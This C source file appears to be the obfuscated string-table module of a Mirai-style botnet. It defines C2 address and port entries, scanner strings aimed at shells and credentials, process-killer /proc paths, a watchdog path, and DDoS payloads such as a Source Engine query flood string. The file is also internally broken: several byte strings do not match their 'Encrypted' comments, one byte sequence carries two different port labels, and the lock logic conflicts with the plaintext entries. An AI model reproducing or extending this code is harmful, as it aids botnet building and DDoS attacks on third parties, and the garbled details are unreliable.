#include "includes.h"
#include "table.h"

static char *table[TABLE_MAX_KEYS];
static BOOL locked[TABLE_MAX_KEYS];

/* XOR encryption/decryption */
static void toggle_obf(uint8_t id) {
    int i;
    for (i = 0; i < util_strlen(table[id]); i++)
        table[id][i] ^= TABLE_KEY;
}

void table_init(void) {
    /* CNC configuration */
    table[TABLE_CNC_DOMAIN] = "\x10\x01\x00\x00\x00"; // Encrypted: "0.0.0.0"
    table[TABLE_CNC_PORT] = "\xef\x0e\x00\x00\x00";   // Encrypted: "3778"
    table[TABLE_SCAN_CB_PORT] = "\xef\x0e\x00\x00\x00"; // Encrypted: "9555"
    
    /* Scanner strings */
    table[TABLE_SCAN_SHELL] = "\x73\x68\x65\x6c\x6c";  // "shell"
    table[TABLE_SCAN_ENABLE] = "\x65\x6e\x61\x62\x6c\x65"; // "enable"
    table[TABLE_SCAN_SYSTEM] = "\x73\x79\x73\x74\x65\x6d"; // "system"
    table[TABLE_SCAN_CREDENTIALS] = "\x63\x72\x65\x64\x65\x6e\x74\x69\x61\x6c\x73"; // "credentials"
    table[TABLE_SCAN_TOKEN] = "\x74\x6f\x6b\x65\x6e"; // "token"
    table[TABLE_EXEC_SUCCESS] = "\x73\x75\x63\x63\x65\x73\x73"; // "success"
    
    /* Killer paths */
    table[TABLE_KILLER_PROC] = "\x2f\x70\x72\x6f\x63\x2f"; // "/proc/"
    table[TABLE_KILLER_EXE] = "\x2f\x65\x78\x65"; // "/exe"
    table[TABLE_KILLER_FD] = "\x2f\x66\x64"; // "/fd"
    table[TABLE_KILLER_TCP] = "\x2f\x70\x72\x6f\x63\x2f\x6e\x65\x74\x2f\x74\x63\x70"; // "/proc/net/tcp"
    
    /* Attack payloads */
    table[TABLE_ATK_VSE] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"; // VSE payload
    table[TABLE_ATK_DNS] = "\x00\x00"; // DNS payload placeholder
    table[TABLE_ATK_UDP] = "\x00"; // UDP payload placeholder
    
    /* Misc */
    table[TABLE_MISC_RAND] = "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39"; // alphanumeric
    table[TABLE_MISC_WATCHDOG] = "\x2f\x77\x61\x74\x63\x68\x64\x6f\x67"; // "/watchdog"
    
    /* Initialize lock status */
    for (int i = 0; i < TABLE_MAX_KEYS; i++)
        locked[i] = FALSE;
}

void table_unlock_val(uint8_t id) {
    if (locked[id]) {
        toggle_obf(id);
        locked[id] = FALSE;
    }
}

void table_lock_val(uint8_t id) {
    if (!locked[id]) {
        toggle_obf(id);
        locked[id] = TRUE;
    }
}

char *table_retrieve_val(int id, int *len) {
    if (table[id] == NULL) return NULL;
    *len = util_strlen(table[id]);
    return table[id];
}
